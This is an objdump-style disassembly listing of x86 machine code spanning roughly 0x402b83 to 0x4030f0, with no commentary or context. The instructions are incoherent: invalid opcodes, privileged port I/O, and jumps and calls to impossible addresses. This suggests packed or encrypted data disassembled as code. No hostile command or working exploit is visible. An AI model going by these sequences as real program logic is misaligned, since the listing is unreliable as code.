  402b83:	98                   	cwtl
  402b84:	1c 50                	sbb    $0x50,%al
  402b86:	87 58 38             	xchg   %ebx,0x38(%eax)
  402b89:	ab                   	stos   %eax,%es:(%edi)
  402b8a:	c3                   	ret
  402b8b:	92                   	xchg   %eax,%edx
  402b8c:	2a f3                	sub    %bl,%dh
  402b8e:	f2 c3                	bnd ret
  402b90:	1c 07                	sbb    $0x7,%al
  402b92:	de 1b                	ficomps (%ebx)
  402b94:	46                   	inc    %esi
  402b95:	be 44 bc ea 1e       	mov    $0x1eeabc44,%esi
  402b9a:	85 2f                	test   %ebp,(%edi)
  402b9c:	a0 80 cb 23 74       	mov    0x7423cb80,%al
  402ba1:	1a 18                	sbb    (%eax),%bl
  402ba3:	f0 fb                	lock sti
  402ba5:	0b bb 08 77 1e ca    	or     -0x35e188f8(%ebx),%edi
  402bab:	40                   	inc    %eax
  402bac:	a9 3f 55 8e d0       	test   $0xd08e553f,%eax
  402bb1:	31 1b                	xor    %ebx,(%ebx)
  402bb3:	55                   	push   %ebp
  402bb4:	58                   	pop    %eax
  402bb5:	0b ba f8 4f 62 7d    	or     0x7d624ff8(%edx),%edi
  402bbb:	d1 4f 9a             	rorl   $1,-0x66(%edi)
  402bbe:	43                   	inc    %ebx
  402bbf:	3f                   	aas
  402bc0:	68 82 01 81 8b       	push   $0x8b810182
  402bc5:	83 76 f7 e8          	xorl   $0xffffffe8,-0x9(%esi)
  402bc9:	59                   	pop    %ecx
  402bca:	30 3d 32 96 3a 9e    	xor    %bh,0x9e3a9632
  402bd0:	e6 ad                	out    %al,$0xad
  402bd2:	48                   	dec    %eax
  402bd3:	0e                   	push   %cs
  402bd4:	72 15                	jb     0x402beb
  402bd6:	e0 25                	loopne 0x402bfd
  402bd8:	4f                   	dec    %edi
  402bd9:	8e 84 d3 48 1f 8f 8e 	mov    -0x7170e0b8(%ebx,%edx,8),%es
  402be0:	7e 19                	jle    0x402bfb
  402be2:	5e                   	pop    %esi
  402be3:	42                   	inc    %edx
  402be4:	2a 38                	sub    (%eax),%bh
  402be6:	c9                   	leave
  402be7:	b3 0d                	mov    $0xd,%bl
  402be9:	d2 ec                	shr    %cl,%ah
  402beb:	73 ed                	jae    0x402bda
  402bed:	ad                   	lods   %ds:(%esi),%eax
  402bee:	43                   	inc    %ebx
  402bef:	ca e0 7c             	lret   $0x7ce0
  402bf2:	43                   	inc    %ebx
  402bf3:	df 74 8d 89          	fbstp  -0x77(%ebp,%ecx,4)
  402bf7:	2e 2f                	cs das
  402bf9:	c7                   	(bad)
  402bfa:	bb d7 f2 c7 46       	mov    $0x46c7f2d7,%ebx
  402bff:	9d                   	popf
  402c00:	2f                   	das
  402c01:	37                   	aaa
  402c02:	b5 0c                	mov    $0xc,%ch
  402c04:	64 eb 22             	fs jmp 0x402c29
  402c07:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402c08:	05 6c d2 f9 29       	add    $0x29f9d26c,%eax
  402c0d:	53                   	push   %ebx
  402c0e:	62 2b                	bound  %ebp,(%ebx)
  402c10:	70 b0                	jo     0x402bc2
  402c12:	53                   	push   %ebx
  402c13:	2b a4 ed 3c 9c 4c 18 	sub    0x184c9c3c(%ebp,%ebp,8),%esp
  402c1a:	8e 1c 5a             	mov    (%edx,%ebx,2),%ds
  402c1d:	63 f7                	arpl   %esi,%edi
  402c1f:	03 b9 ea 62 ca 67    	add    0x67ca62ea(%ecx),%edi
  402c25:	4f                   	dec    %edi
  402c26:	1e                   	push   %ds
  402c27:	89 d6                	mov    %edx,%esi
  402c29:	de c4                	faddp  %st,%st(4)
  402c2b:	2e 7e bf             	jle,pn 0x402bed
  402c2e:	a3 09 52 9a ac       	mov    %eax,0xac9a5209
  402c33:	f5                   	cmc
  402c34:	2b ee                	sub    %esi,%ebp
  402c36:	0d fe 05 84 40       	or     $0x408405fe,%eax
  402c3b:	2f                   	das
  402c3c:	d0 22                	shlb   $1,(%edx)
  402c3e:	0d db f8 26 8c       	or     $0x8c26f8db,%eax
  402c43:	21 ce                	and    %ecx,%esi
  402c45:	ba 5f df 10 d7       	mov    $0xd710df5f,%edx
  402c4a:	bb 9f d9 4c e9       	mov    $0xe94cd99f,%ebx
  402c4f:	7b 18                	jnp    0x402c69
  402c51:	a2 7e 55 d1 b4       	mov    %al,0xb4d1557e
  402c56:	b3 a4                	mov    $0xa4,%bl
  402c58:	80 7c db 9f 73       	cmpb   $0x73,-0x61(%ebx,%ebx,8)
  402c5d:	dd 6a 0c             	(bad) 0xc(%edx)
  402c60:	ed                   	in     (%dx),%eax
  402c61:	32 71 fb             	xor    -0x5(%ecx),%dh
  402c64:	e9 9d dc 6c f6       	jmp    0xf6ad0906
  402c69:	3c 02                	cmp    $0x2,%al
  402c6b:	dd 1b                	fstpl  (%ebx)
  402c6d:	5e                   	pop    %esi
  402c6e:	d9 a4 91 14 42 7c 52 	fldenv 0x527c4214(%ecx,%edx,4)
  402c75:	f4                   	hlt
  402c76:	c3                   	ret
  402c77:	c1 19 42             	rcrl   $0x42,(%ecx)
  402c7a:	14 c4                	adc    $0xc4,%al
  402c7c:	94                   	xchg   %eax,%esp
  402c7d:	6b a9 8c ba 13 bf 10 	imul   $0x10,-0x40ec4574(%ecx),%ebp
  402c84:	24 13                	and    $0x13,%al
  402c86:	cb                   	lret
  402c87:	60                   	pusha
  402c88:	01 66 97             	add    %esp,-0x69(%esi)
  402c8b:	d7                   	xlat   %ds:(%ebx)
  402c8c:	89 14 58             	mov    %edx,(%eax,%ebx,2)
  402c8f:	fb                   	sti
  402c90:	2a 19                	sub    (%ecx),%bl
  402c92:	f2 18 d0             	repnz sbb %dl,%al
  402c95:	cc                   	int3
  402c96:	65 bc 10 82 78 0a    	gs mov $0xa788210,%esp
  402c9c:	d8 89 4f 50 be 61    	fmuls  0x61be504f(%ecx)
  402ca2:	63 e2                	arpl   %esp,%edx
  402ca4:	93                   	xchg   %eax,%ebx
  402ca5:	e8 66 58 4f 62       	call   0x628f8510
  402caa:	4d                   	dec    %ebp
  402cab:	f5                   	cmc
  402cac:	c3                   	ret
  402cad:	21 93 70 51 20 3f    	and    %edx,0x3f205170(%ebx)
  402cb3:	e3 3d                	jecxz  0x402cf2
  402cb5:	3c 13                	cmp    $0x13,%al
  402cb7:	81 41 56 63 f9 f3 f3 	addl   $0xf3f3f963,0x56(%ecx)
  402cbe:	f8                   	clc
  402cbf:	8a f2                	mov    %dl,%dh
  402cc1:	a9 9d f0 b8 39       	test   $0x39b8f09d,%eax
  402cc6:	69 ba 07 90 bd 51 31 	imul   $0x41b28831,0x51bd9007(%edx),%edi
  402ccd:	88 b2 41 
  402cd0:	67 f8                	addr16 clc
  402cd2:	92                   	xchg   %eax,%edx
  402cd3:	6e                   	outsb  %ds:(%esi),(%dx)
  402cd4:	4e                   	dec    %esi
  402cd5:	7e 0f                	jle    0x402ce6
  402cd7:	7c 7e                	jl     0x402d57
  402cd9:	18 47 df             	sbb    %al,-0x21(%edi)
  402cdc:	0b 53 55             	or     0x55(%ebx),%edx
  402cdf:	ea 21 b1 0f aa 80 aa 	ljmp   $0xaa80,$0xaa0fb121
  402ce6:	08 63 0b             	or     %ah,0xb(%ebx)
  402ce9:	53                   	push   %ebx
  402cea:	f7 49 60 06 93 29 73 	testl  $0x73299306,0x60(%ecx)
  402cf1:	4b                   	dec    %ebx
  402cf2:	e9 d3 d7 43 10       	jmp    0x108404ca
  402cf7:	9e                   	sahf
  402cf8:	bc 78 57 10 a5       	mov    $0xa5105778,%esp
  402cfd:	ac                   	lods   %ds:(%esi),%al
  402cfe:	26 e9 26 1c fe e2    	es jmp 0xe33e492a
  402d04:	99                   	cltd
  402d05:	36 04 52             	ss add $0x52,%al
  402d08:	61                   	popa
  402d09:	6f                   	outsl  %ds:(%esi),(%dx)
  402d0a:	30 00                	xor    %al,(%eax)
  402d0c:	b6 5e                	mov    $0x5e,%dh
  402d0e:	45                   	inc    %ebp
  402d0f:	eb 43                	jmp    0x402d54
  402d11:	6f                   	outsl  %ds:(%esi),(%dx)
  402d12:	55                   	push   %ebp
  402d13:	8f                   	(bad)
  402d14:	72 14                	jb     0x402d2a
  402d16:	af                   	scas   %es:(%edi),%eax
  402d17:	98                   	cwtl
  402d18:	24 72                	and    $0x72,%al
  402d1a:	6e                   	outsb  %ds:(%esi),(%dx)
  402d1b:	e7 78                	out    %eax,$0x78
  402d1d:	16                   	push   %ss
  402d1e:	22 89 27 6e 91 53    	and    0x53916e27(%ecx),%cl
  402d24:	22 a1 e4 32 d0 68    	and    0x68d032e4(%ecx),%ah
  402d2a:	69 43 fe 6e 69 04 34 	imul   $0x3404696e,-0x2(%ebx),%eax
  402d31:	9f                   	lahf
  402d32:	d5 62                	aad    $0x62
  402d34:	8f                   	(bad)
  402d35:	f5                   	cmc
  402d36:	c9                   	leave
  402d37:	94                   	xchg   %eax,%esp
  402d38:	b6 83                	mov    $0x83,%dh
  402d3a:	37                   	aaa
  402d3b:	49                   	dec    %ecx
  402d3c:	72 d3                	jb     0x402d11
  402d3e:	3e 2c f7             	ds sub $0xf7,%al
  402d41:	fc                   	cld
  402d42:	f5                   	cmc
  402d43:	4c                   	dec    %esp
  402d44:	95                   	xchg   %eax,%ebp
  402d45:	76 1f                	jbe    0x402d66
  402d47:	cc                   	int3
  402d48:	00 14 02             	add    %dl,(%edx,%eax,1)
  402d4b:	9d                   	popf
  402d4c:	81 10 9f a1 bc 65    	adcl   $0x65bca19f,(%eax)
  402d52:	10 d0                	adc    %dl,%al
  402d54:	43                   	inc    %ebx
  402d55:	7d af                	jge    0x402d06
  402d57:	c3                   	ret
  402d58:	34 79                	xor    $0x79,%al
  402d5a:	cd 2d                	int    $0x2d
  402d5c:	f9                   	stc
  402d5d:	2b c9                	sub    %ecx,%ecx
  402d5f:	32 9a e3 d1 c2 fe    	xor    -0x13d2e1d(%edx),%bl
  402d65:	e4 5d                	in     $0x5d,%al
  402d67:	de 83 27 52 4c 32    	fiadds 0x324c5227(%ebx)
  402d6d:	f8                   	clc
  402d6e:	8a 91 cc 90 17 8f    	mov    -0x70e86f34(%ecx),%dl
  402d74:	05 40 45 54 a2       	add    $0xa2544540,%eax
  402d79:	ce                   	into
  402d7a:	b4 e6                	mov    $0xe6,%ah
  402d7c:	9a dc 9e 75 1f f8 11 	lcall  $0x11f8,$0x1f759edc
  402d83:	5c                   	pop    %esp
  402d84:	44                   	inc    %esp
  402d85:	b7 74                	mov    $0x74,%bh
  402d87:	92                   	xchg   %eax,%edx
  402d88:	c0 fc 07             	sar    $0x7,%ah
  402d8b:	3a 96 3d a0 4c ff    	cmp    -0xb35fc3(%esi),%dl
  402d91:	bd ed 2a 4b 68       	mov    $0x684b2aed,%ebp
  402d96:	32 cb                	xor    %bl,%cl
  402d98:	d3 f1                	shl    %cl,%ecx
  402d9a:	2f                   	das
  402d9b:	ec                   	in     (%dx),%al
  402d9c:	91                   	xchg   %eax,%ecx
  402d9d:	d4 82                	aam    $0x82
  402d9f:	5c                   	pop    %esp
  402da0:	ef                   	out    %eax,(%dx)
  402da1:	1c 3e                	sbb    $0x3e,%al
  402da3:	17                   	pop    %ss
  402da4:	e3 35                	jecxz  0x402ddb
  402da6:	14 2b                	adc    $0x2b,%al
  402da8:	9c                   	pushf
  402da9:	59                   	pop    %ecx
  402daa:	1d 18 b7 4e 99       	sbb    $0x994eb718,%eax
  402daf:	27                   	daa
  402db0:	40                   	inc    %eax
  402db1:	4d                   	dec    %ebp
  402db2:	55                   	push   %ebp
  402db3:	96                   	xchg   %eax,%esi
  402db4:	c7                   	(bad)
  402db5:	aa                   	stos   %al,%es:(%edi)
  402db6:	8f a9 fb ea          	(bad)
  402dba:	11 01                	adc    %eax,(%ecx)
  402dbc:	cc                   	int3
  402dbd:	56                   	push   %esi
  402dbe:	85 9a de 49 50 ee    	test   %ebx,-0x11afb622(%edx)
  402dc4:	e9 d9 d1 ff 33       	jmp    0x343fffa2
  402dc9:	8d                   	lea    (bad),%esi
  402dca:	f3 87 e2             	repz xchg %esp,%edx
  402dcd:	7d a6                	jge    0x402d75
  402dcf:	57                   	push   %edi
  402dd0:	48                   	dec    %eax
  402dd1:	4e                   	dec    %esi
  402dd2:	6b d2 cc             	imul   $0xffffffcc,%edx,%edx
  402dd5:	b0 cd                	mov    $0xcd,%al
  402dd7:	e0 ee                	loopne 0x402dc7
  402dd9:	ff 98 55 76 9a db    	lcall  *-0x246589ab(%eax)
  402ddf:	27                   	daa
  402de0:	91                   	xchg   %eax,%ecx
  402de1:	34 d0                	xor    $0xd0,%al
  402de3:	15 91 99 22 0b       	adc    $0xb229991,%eax
  402de8:	9c                   	pushf
  402de9:	d3 4c a9 65          	rorl   %cl,0x65(%ecx,%ebp,4)
  402ded:	c6                   	(bad)
  402dee:	6d                   	insl   (%dx),%es:(%edi)
  402def:	37                   	aaa
  402df0:	9b                   	fwait
  402df1:	82 8c 0d 06 28 98 8a 	orb    $0x81,-0x7567d7fa(%ebp,%ecx,1)
  402df8:	81 
  402df9:	75 37                	jne    0x402e32
  402dfb:	6c                   	insb   (%dx),%es:(%edi)
  402dfc:	15 d4 13 29 3d       	adc    $0x3d2913d4,%eax
  402e01:	8d                   	lea    (bad),%edx
  402e02:	d4 0a                	aam    $0xa
  402e04:	64 b4 53             	fs mov $0x53,%ah
  402e07:	8d 5c 26 a2          	lea    -0x5e(%esi,%eiz,1),%ebx
  402e0b:	26 14 92             	es adc $0x92,%al
  402e0e:	2e 06                	cs push %es
  402e10:	11 f0                	adc    %esi,%eax
  402e12:	9e                   	sahf
  402e13:	8a 6c 22 b6          	mov    -0x4a(%edx,%eiz,1),%ch
  402e17:	cf                   	iret
  402e18:	a8 ac                	test   $0xac,%al
  402e1a:	73 49                	jae    0x402e65
  402e1c:	8b 28                	mov    (%eax),%ebp
  402e1e:	d2 89 63 c4 f0 ee    	rorb   %cl,-0x110f3b9d(%ecx)
  402e24:	1d 77 4e 06 0d       	sbb    $0xd064e77,%eax
  402e29:	34 4d                	xor    $0x4d,%al
  402e2b:	83 5f 5a e7          	sbbl   $0xffffffe7,0x5a(%edi)
  402e2f:	85 f0                	test   %esi,%eax
  402e31:	63 6c b3 a9          	arpl   %ebp,-0x57(%ebx,%esi,4)
  402e35:	0a b6 3b 4d b3 69    	or     0x69b34d3b(%esi),%dh
  402e3b:	b5 ef                	mov    $0xef,%ch
  402e3d:	fd                   	std
  402e3e:	dc 82 12 87 f0 30    	faddl  0x30f08712(%edx)
  402e44:	c8 39 87 6b          	enter  $0x8739,$0x6b
  402e48:	b3 fb                	mov    $0xfb,%bl
  402e4a:	94                   	xchg   %eax,%esp
  402e4b:	4c                   	dec    %esp
  402e4c:	56                   	push   %esi
  402e4d:	61                   	popa
  402e4e:	ac                   	lods   %ds:(%esi),%al
  402e4f:	ad                   	lods   %ds:(%esi),%eax
  402e50:	64 58                	fs pop %eax
  402e52:	3a 22                	cmp    (%edx),%ah
  402e54:	6e                   	outsb  %ds:(%esi),(%dx)
  402e55:	47                   	inc    %edi
  402e56:	a3 00 42 28 10       	mov    %eax,0x10284200
  402e5b:	50                   	push   %eax
  402e5c:	6d                   	insl   (%dx),%es:(%edi)
  402e5d:	26 56                	es push %esi
  402e5f:	72 42                	jb     0x402ea3
  402e61:	6d                   	insl   (%dx),%es:(%edi)
  402e62:	c0 c2 e2             	rol    $0xe2,%dl
  402e65:	09 08                	or     %ecx,(%eax)
  402e67:	d3 d4                	rcl    %cl,%esp
  402e69:	fb                   	sti
  402e6a:	27                   	daa
  402e6b:	fa                   	cli
  402e6c:	f8                   	clc
  402e6d:	a9 14 72 94 e9       	test   $0xe9947214,%eax
  402e72:	06                   	push   %es
  402e73:	b9 61 03 cf 59       	mov    $0x59cf0361,%ecx
  402e78:	8e ee                	mov    %esi,%gs
  402e7a:	63 8a 1b 51 9b 64    	arpl   %ecx,0x649b511b(%edx)
  402e80:	24 87                	and    $0x87,%al
  402e82:	50                   	push   %eax
  402e83:	9d                   	popf
  402e84:	aa                   	stos   %al,%es:(%edi)
  402e85:	85 97 a4 66 0b 3a    	test   %edx,0x3a0b66a4(%edi)
  402e8b:	af                   	scas   %es:(%edi),%eax
  402e8c:	44                   	inc    %esp
  402e8d:	77 6b                	ja     0x402efa
  402e8f:	e3 44                	jecxz  0x402ed5
  402e91:	aa                   	stos   %al,%es:(%edi)
  402e92:	48                   	dec    %eax
  402e93:	66 88 e1             	data16 mov %ah,%cl
  402e96:	48                   	dec    %eax
  402e97:	22 cb                	and    %bl,%cl
  402e99:	1e                   	push   %ds
  402e9a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402e9b:	76 7e                	jbe    0x402f1b
  402e9d:	b2 95                	mov    $0x95,%dl
  402e9f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402ea0:	f4                   	hlt
  402ea1:	3a 11                	cmp    (%ecx),%dl
  402ea3:	70 d2                	jo     0x402e77
  402ea5:	87 b1 f2 28 cf 4f    	xchg   %esi,0x4fcf28f2(%ecx)
  402eab:	61                   	popa
  402eac:	3c 86                	cmp    $0x86,%al
  402eae:	17                   	pop    %ss
  402eaf:	0b a6 0c 37 29 5c    	or     0x5c29370c(%esi),%esp
  402eb5:	d7                   	xlat   %ds:(%ebx)
  402eb6:	5e                   	pop    %esi
  402eb7:	ea 29 ef c2 0f 2c cb 	ljmp   $0xcb2c,$0xfc2ef29
  402ebe:	0f 42 ff             	cmovb  %edi,%edi
  402ec1:	07                   	pop    %es
  402ec2:	73 7b                	jae    0x402f3f
  402ec4:	98                   	cwtl
  402ec5:	a0 c1 64 4a 60       	mov    0x604a64c1,%al
  402eca:	ac                   	lods   %ds:(%esi),%al
  402ecb:	23 98 36 d5 4f 3e    	and    0x3e4fd536(%eax),%ebx
  402ed1:	cf                   	iret
  402ed2:	77 ba                	ja     0x402e8e
  402ed4:	da db                	fcmovu %st(3),%st
  402ed6:	cc                   	int3
  402ed7:	ec                   	in     (%dx),%al
  402ed8:	b3 50                	mov    $0x50,%bl
  402eda:	eb d7                	jmp    0x402eb3
  402edc:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402edd:	ee                   	out    %al,(%dx)
  402ede:	a8 65                	test   $0x65,%al
  402ee0:	4c                   	dec    %esp
  402ee1:	13 6e 27             	adc    0x27(%esi),%ebp
  402ee4:	9f                   	lahf
  402ee5:	39 a6 3c 5f 47 94    	cmp    %esp,-0x6bb8a0c4(%esi)
  402eeb:	f6 01 9b             	testb  $0x9b,(%ecx)
  402eee:	21 e9                	and    %ebp,%ecx
  402ef0:	23 21                	and    (%ecx),%esp
  402ef2:	95                   	xchg   %eax,%ebp
  402ef3:	fb                   	sti
  402ef4:	ae                   	scas   %es:(%edi),%al
  402ef5:	63 dc                	arpl   %ebx,%esp
  402ef7:	d5 03                	aad    $0x3
  402ef9:	50                   	push   %eax
  402efa:	d5 71                	aad    $0x71
  402efc:	01 12                	add    %edx,(%edx)
  402efe:	e3 84                	jecxz  0x402e84
  402f00:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402f01:	fd                   	std
  402f02:	75 e3                	jne    0x402ee7
  402f04:	9f                   	lahf
  402f05:	d7                   	xlat   %ds:(%ebx)
  402f06:	72 a5                	jb     0x402ead
  402f08:	2b 1a                	sub    (%edx),%ebx
  402f0a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402f0b:	98                   	cwtl
  402f0c:	64 2a ee             	fs sub %dh,%ch
  402f0f:	ed                   	in     (%dx),%eax
  402f10:	04 c6                	add    $0xc6,%al
  402f12:	ae                   	scas   %es:(%edi),%al
  402f13:	ae                   	scas   %es:(%edi),%al
  402f14:	31 dd                	xor    %ebx,%ebp
  402f16:	5c                   	pop    %esp
  402f17:	a9 87 4b bb d7       	test   $0xd7bb4b87,%eax
  402f1c:	fc                   	cld
  402f1d:	2e b8 11 72 59 50    	cs mov $0x50597211,%eax
  402f23:	ba 73 d1 d9 b7       	mov    $0xb7d9d173,%edx
  402f28:	b1 3a                	mov    $0x3a,%cl
  402f2a:	86 f8                	xchg   %bh,%al
  402f2c:	de fb                	fdivrp %st,%st(3)
  402f2e:	75 78                	jne    0x402fa8
  402f30:	be 02 bc f4 81       	mov    $0x81f4bc02,%esi
  402f35:	af                   	scas   %es:(%edi),%eax
  402f36:	14 3f                	adc    $0x3f,%al
  402f38:	da c5                	fcmovb %st(5),%st
  402f3a:	a1 e0 c3 b4 fa       	mov    0xfab4c3e0,%eax
  402f3f:	34 ff                	xor    $0xff,%al
  402f41:	57                   	push   %edi
  402f42:	19 e5                	sbb    %esp,%ebp
  402f44:	0a 61 bb             	or     -0x45(%ecx),%ah
  402f47:	3c 45                	cmp    $0x45,%al
  402f49:	bf 9e 1b 2b 64       	mov    $0x642b1b9e,%edi
  402f4e:	0d d5 26 31 5e       	or     $0x5e3126d5,%eax
  402f53:	41                   	inc    %ecx
  402f54:	9b                   	fwait
  402f55:	9c                   	pushf
  402f56:	18 c5                	sbb    %al,%ch
  402f58:	75 57                	jne    0x402fb1
  402f5a:	30 ff                	xor    %bh,%bh
  402f5c:	34 04                	xor    $0x4,%al
  402f5e:	5e                   	pop    %esi
  402f5f:	f9                   	stc
  402f60:	00 95 e8 f1 f2 95    	add    %dl,-0x6a0d0e18(%ebp)
  402f66:	e7 b8                	out    %eax,$0xb8
  402f68:	1b ef                	sbb    %edi,%ebp
  402f6a:	2a ab 9f 12 d7 5a    	sub    0x5ad7129f(%ebx),%ch
  402f70:	79 8b                	jns    0x402efd
  402f72:	cd 1a                	int    $0x1a
  402f74:	19 30                	sbb    %esi,(%eax)
  402f76:	cd 62                	int    $0x62
  402f78:	ea 6b 4e 75 95 cb 7c 	ljmp   $0x7ccb,$0x95754e6b
  402f7f:	f2 23 ce             	repnz and %esi,%ecx
  402f82:	fa                   	cli
  402f83:	3b dc                	cmp    %esp,%ebx
  402f85:	6f                   	outsl  %ds:(%esi),(%dx)
  402f86:	c9                   	leave
  402f87:	7f fb                	jg     0x402f84
  402f89:	8c bd ed 2f e1 ea    	mov    %?,-0x151ed013(%ebp)
  402f8f:	81 1f 63 65 0d cf    	sbbl   $0xcf0d6563,(%edi)
  402f95:	e8 7b 0d fd 80       	call   0x813d3d15
  402f9a:	62 f6 3f 98 2c       	(bad)
  402f9f:	2f                   	das
  402fa0:	0d 20 c2 2c 6f       	or     $0x6f2cc220,%eax
  402fa5:	d6                   	salc
  402fa6:	7a 63                	jp     0x40300b
  402fa8:	8b c2                	mov    %edx,%eax
  402faa:	7d 3f                	jge    0x402feb
  402fac:	20 0a                	and    %cl,(%edx)
  402fae:	60                   	pusha
  402faf:	7c f4                	jl     0x402fa5
  402fb1:	9c                   	pushf
  402fb2:	3d 6d 6b 49 95       	cmp    $0x95496b6d,%eax
  402fb7:	17                   	pop    %ss
  402fb8:	3d 45 e8 70 35       	cmp    $0x3570e845,%eax
  402fbd:	3f                   	aas
  402fbe:	7d 4d                	jge    0x40300d
  402fc0:	55                   	push   %ebp
  402fc1:	3a 73 71             	cmp    0x71(%ebx),%dh
  402fc4:	ba 87 40 64 0e       	mov    $0xe644087,%edx
  402fc9:	ad                   	lods   %ds:(%esi),%eax
  402fca:	6e                   	outsb  %ds:(%esi),(%dx)
  402fcb:	e0 ea                	loopne 0x402fb7
  402fcd:	58                   	pop    %eax
  402fce:	bf bd 30 9b 36       	mov    $0x369b30bd,%edi
  402fd3:	81 79 43 14 ec 90 7a 	cmpl   $0x7a90ec14,0x43(%ecx)
  402fda:	86 ce                	xchg   %cl,%dh
  402fdc:	cd a7                	int    $0xa7
  402fde:	28 da                	sub    %bl,%dl
  402fe0:	8c 7e f4             	mov    %?,-0xc(%esi)
  402fe3:	7b 99                	jnp    0x402f7e
  402fe5:	f7 71 97             	divl   -0x69(%ecx)
  402fe8:	3a 4e a8             	cmp    -0x58(%esi),%cl
  402feb:	51                   	push   %ecx
  402fec:	e7 ec                	out    %eax,$0xec
  402fee:	6b 1a b2             	imul   $0xffffffb2,(%edx),%ebx
  402ff1:	7a 2e                	jp     0x403021
  402ff3:	ed                   	in     (%dx),%eax
  402ff4:	2a 4c 98 9c          	sub    -0x64(%eax,%ebx,4),%cl
  402ff8:	3d 7a 53 11 fe       	cmp    $0xfe11537a,%eax
  402ffd:	ed                   	in     (%dx),%eax
  402ffe:	c7                   	(bad)
  402fff:	af                   	scas   %es:(%edi),%eax
  403000:	cd 69                	int    $0x69
  403002:	a3 94 bd 68 d1       	mov    %eax,0xd168bd94
  403007:	30 bd b1 fc 37 ca    	xor    %bh,-0x35c8034f(%ebp)
  40300d:	59                   	pop    %ecx
  40300e:	35 63 3c 05 50       	xor    $0x50053c63,%eax
  403013:	44                   	inc    %esp
  403014:	d3 13                	rcll   %cl,(%ebx)
  403016:	49                   	dec    %ecx
  403017:	45                   	inc    %ebp
  403018:	34 5e                	xor    $0x5e,%al
  40301a:	40                   	inc    %eax
  40301b:	5f                   	pop    %edi
  40301c:	6b 5f 2e d2          	imul   $0xffffffd2,0x2e(%edi),%ebx
  403020:	b1 cf                	mov    $0xcf,%cl
  403022:	e8 ad 20 ab 06       	call   0x6eb50d4
  403027:	6b f2 48             	imul   $0x48,%edx,%esi
  40302a:	c8 07 85 09          	enter  $0x8507,$0x9
  40302e:	2f                   	das
  40302f:	13 5e 0f             	adc    0xf(%esi),%ebx
  403032:	72 39                	jb     0x40306d
  403034:	3f                   	aas
  403035:	32 2c 56             	xor    (%esi,%edx,2),%ch
  403038:	df 68 c5             	fildll -0x3b(%eax)
  40303b:	2c 68                	sub    $0x68,%al
  40303d:	3b 54 86 50          	cmp    0x50(%esi,%eax,4),%edx
  403041:	94                   	xchg   %eax,%esp
  403042:	50                   	push   %eax
  403043:	d7                   	xlat   %ds:(%ebx)
  403044:	fe                   	(bad)
  403045:	5c                   	pop    %esp
  403046:	58                   	pop    %eax
  403047:	b2 0f                	mov    $0xf,%dl
  403049:	b0 60                	mov    $0x60,%al
  40304b:	d3 fd                	sar    %cl,%ebp
  40304d:	90                   	nop
  40304e:	5a                   	pop    %edx
  40304f:	47                   	inc    %edi
  403050:	b1 30                	mov    $0x30,%cl
  403052:	db 7d fc             	fstpt  -0x4(%ebp)
  403055:	43                   	inc    %ebx
  403056:	2e d1 c0             	cs rol $1,%eax
  403059:	43                   	inc    %ebx
  40305a:	c1 aa 21 d0 5f 90 af 	shrl   $0xaf,-0x6fa02fdf(%edx)
  403061:	be a6 2c 05 dd       	mov    $0xdd052ca6,%esi
  403066:	4d                   	dec    %ebp
  403067:	d8 dc                	fcomp  %st(4)
  403069:	34 73                	xor    $0x73,%al
  40306b:	6c                   	insb   (%dx),%es:(%edi)
  40306c:	5e                   	pop    %esi
  40306d:	ef                   	out    %eax,(%dx)
  40306e:	b5 dc                	mov    $0xdc,%ch
  403070:	c2 96 71             	ret    $0x7196
  403073:	de 0f                	fimuls (%edi)
  403075:	78 c8                	js     0x40303f
  403077:	95                   	xchg   %eax,%ebp
  403078:	69 13 14 d2 d9 8b    	imul   $0x8bd9d214,(%ebx),%edx
  40307e:	74 0e                	je     0x40308e
  403080:	d8 4d 0e             	fmuls  0xe(%ebp)
  403083:	45                   	inc    %ebp
  403084:	38 8f aa 3f 98 a0    	cmp    %cl,-0x5f67c056(%edi)
  40308a:	70 f4                	jo     0x403080
  40308c:	6e                   	outsb  %ds:(%esi),(%dx)
  40308d:	66 f8                	data16 clc
  40308f:	60                   	pusha
  403090:	f9                   	stc
  403091:	64 ce                	fs into
  403093:	98                   	cwtl
  403094:	44                   	inc    %esp
  403095:	48                   	dec    %eax
  403096:	17                   	pop    %ss
  403097:	ba e9 a1 a4 4f       	mov    $0x4fa4a1e9,%edx
  40309c:	fb                   	sti
  40309d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40309e:	1a 77 f8             	sbb    -0x8(%edi),%dh
  4030a1:	54                   	push   %esp
  4030a2:	98                   	cwtl
  4030a3:	4a                   	dec    %edx
  4030a4:	52                   	push   %edx
  4030a5:	42                   	inc    %edx
  4030a6:	ae                   	scas   %es:(%edi),%al
  4030a7:	ca 44 50             	lret   $0x5044
  4030aa:	ee                   	out    %al,(%dx)
  4030ab:	bb 14 d7 59 a4       	mov    $0xa459d714,%ebx
  4030b0:	7f 38                	jg     0x4030ea
  4030b2:	84 41 73             	test   %al,0x73(%ecx)
  4030b5:	60                   	pusha
  4030b6:	e2 03                	loop   0x4030bb
  4030b8:	b1 16                	mov    $0x16,%cl
  4030ba:	90                   	nop
  4030bb:	c5 c7 fb             	(bad)
  4030be:	4c                   	dec    %esp
  4030bf:	b7 00                	mov    $0x0,%bh
  4030c1:	b7 77                	mov    $0x77,%bh
  4030c3:	19 cc                	sbb    %ecx,%esp
  4030c5:	8c 0a                	mov    %cs,(%edx)
  4030c7:	be 00 ae 8e ad       	mov    $0xad8eae00,%esi
  4030cc:	45                   	inc    %ebp
  4030cd:	2d 01 62 10 c7       	sub    $0xc7106201,%eax
  4030d2:	f2 a3 0d 3c be 31    	repnz mov %eax,0x31be3c0d
  4030d8:	ab                   	stos   %eax,%es:(%edi)
  4030d9:	76 ff                	jbe    0x4030da
  4030db:	96                   	xchg   %eax,%esi
  4030dc:	59                   	pop    %ecx
  4030dd:	c5 22                	lds    (%edx),%esp
  4030df:	cd 9f                	int    $0x9f
  4030e1:	bf 17 b9 20 3f       	mov    $0x3f20b917,%edi
  4030e6:	b5 02                	mov    $0x2,%ch
  4030e8:	33 f8                	xor    %eax,%edi
  4030ea:	c1 5d 05 ee          	rcrl   $0xee,0x5(%ebp)
  4030ee:	94                   	xchg   %eax,%esp
  4030ef:	97                   	xchg   %eax,%edi
  4030f0:	7a b1                	jp     0x4030a3
